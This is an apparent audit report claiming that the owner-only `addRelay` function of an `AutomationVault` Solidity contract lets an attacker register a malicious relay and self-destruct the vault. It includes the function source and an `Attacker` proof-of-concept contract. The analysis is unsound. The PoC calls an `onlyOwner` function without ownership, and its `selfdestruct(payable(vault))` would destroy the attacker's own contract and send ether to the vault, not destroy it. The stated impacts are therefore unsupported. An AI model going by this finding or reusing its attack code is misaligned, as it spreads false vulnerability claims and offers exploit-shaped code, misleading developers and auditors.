# Malicious Relay Exploitation for Contract Self-Destruction in `AutomationVault.sol` `addRelay` Function

## Summary
The vulnerability lies in the `addRelay` function of the `AutomationVault` contract. By manipulating the function to approve a malicious relay, an attacker can introduce a malicious job with the ability to execute a self-destruct function on the contract. This exploitation can lead to the destruction of the contract, resulting in loss of control and potentially causing significant financial and operational damage to the ecosystem.

## Vulnerability Detail
The `addRelay` function in the `AutomationVault` contract is responsible for approving a relay to execute specific jobs and call certain functions. This function accepts a relay address, a list of caller addresses, and job data as input parameters. The function adds the relay to the list of approved relays and sets the approved callers and jobs for the relay.

The vulnerability arises because the function does not validate the contracts associated with the relay and job data. This oversight allows an attacker to introduce a malicious relay and job data that can include contracts with harmful functions.

In particular, an attacker can craft a malicious relay that includes a job data array with a job contract containing a `selfdestruct` function. If the malicious relay is approved, the contract's execution could potentially trigger the `selfdestruct` function, resulting in the complete destruction of the `AutomationVault` contract. This would disrupt the ecosystem and cause loss of funds and control.

Additionally, because the `addRelay` function does not verify the legitimacy of the provided job contracts, the attacker can take advantage of this oversight to introduce other malicious functions that can disrupt the contract's operations or steal funds.

The lack of proper validation in the `addRelay` function leaves the contract exposed to serious threats, making it crucial to implement measures to verify the integrity and safety of the relay and job data being added.
```solidity
  function addRelay(
    address _relay,
    address[] calldata _callers,
    IAutomationVault.JobData[] calldata _jobsData
  ) external onlyOwner {
    if (_relay == address(0)) revert AutomationVault_RelayZero();

    // If the relay is not in the list of relays, add it
    if (!_relays.add(_relay)) revert AutomationVault_RelayAlreadyApproved();
    emit ApproveRelay(_relay);

    // Create the counters variables
    uint256 _i;
    uint256 _j;

    // Create the length variables
    uint256 _valuesLength = _callers.length;

    // Set the callers for the relay
    for (_i; _i < _valuesLength;) {
      if (_approvedCallers[_relay].add(_callers[_i])) {
        emit ApproveRelayCaller(_relay, _callers[_i]);
      }

      unchecked {
        ++_i;
      }
    }

    // Get the length of the jobs data array
    _valuesLength = _jobsData.length;

    // Create the selector length variable
    uint256 _selectorsLength;

    // Set the jobs and their selectors for the relay
    for (_i = 0; _i < _valuesLength;) {
      IAutomationVault.JobData memory _jobData = _jobsData[_i];

      // Necessary to avoid an empty job from being assigned to selectors
      if (_jobData.job != address(0)) {
        // Set the job for the relay
        if (_approvedJobs[_relay].add(_jobData.job)) {
          emit ApproveJob(_jobData.job);
        }

        // Get the length of the selectors array
        _selectorsLength = _jobData.functionSelectors.length;

        // Set the selectors for the job
        for (_j = 0; _j < _selectorsLength;) {
          if (_approvedJobSelectors[_relay][_jobData.job].add(_jobData.functionSelectors[_j])) {
            emit ApproveJobSelector(_jobData.job, _jobData.functionSelectors[_j]);
          }

          unchecked {
            ++_j;
          }
        }
      }

      unchecked {
        ++_i;
      }
    }
  }

```

## Impact
 - Contract Destruction: If a malicious relay containing a job contract with a `selfdestruct` function is added, the `AutomationVault` contract can be self-destructed, leading to the complete loss of contract functionality and any funds held within it.

-  Loss of Funds: If the contract is destroyed, all funds stored in the `AutomationVault` contract can be permanently lost, affecting the owner and any users who rely on the contract.

-    Disruption of Operations: The self-destruction of the contract would disrupt the entire operation of the `AutomationVault` system, affecting job executions, relay approvals, and payment distributions.

 -   Security Risks: Besides self-destruction, other malicious functions introduced via the relay and job data could lead to unauthorized fund withdrawals, manipulation of data, or other security breaches.

// Import the AutomationVault interface

contract Attacker {
    // Reference to the AutomationVault contract
    AutomationVault vault;

    // Constructor accepts the address of the AutomationVault contract to target
    constructor(address _vaultAddress) {

        vault = AutomationVault(_vaultAddress);
    }

    // Function to execute the exploit
    function exploit() external {
        // Define a malicious relay address (the attacker's contract address)
        address maliciousRelay = address(this);

        // Define a list of callers for the relay (in this case, the attacker itself)
        address[] memory callers = new address[](1);
        callers[0] = maliciousRelay;

        // Define the job data array with a single job
        IAutomationVault.JobData[] memory jobsData = new IAutomationVault.JobData[](1);
        // Set the job address as the attacker's contract (malicious job)
        jobsData[0].job = address(this);
        // Define function selectors for the malicious job
        // The function selector will be for the `destroyVault` function
        jobsData[0].functionSelectors = new bytes4[](1);
        jobsData[0].functionSelectors[0] = this.destroyVault.selector;

        // Call addRelay to exploit the contract
        vault.addRelay(maliciousRelay, callers, jobsData);
    }

    // Malicious function that self-destructs the AutomationVault contract
    function destroyVault() external {
        // Self-destruct the AutomationVault contract
        selfdestruct(payable(vault));
    }
}

## Tool used

Manual Review

## Recommendation
- Strict Validation: Implement strict validation and verification of relay and job data provided through the `addRelay` function. Ensure that any job contracts added are audited and verified for safety.
- Allowlist Approved Contracts: Maintain an `allowlist` of approved job contracts that can be added to relays. This list should be managed by the owner and include only verified, secure contracts.
- Function Restriction: Implement function restrictions in job contracts to prevent the addition of contracts with dangerous functions like `selfdestruct` or other malicious actions. Job contracts should adhere to strict security standards
- Emergency Stop Mechanism: Consider implementing an emergency stop or pause mechanism to halt operations temporarily if malicious activity is detected.
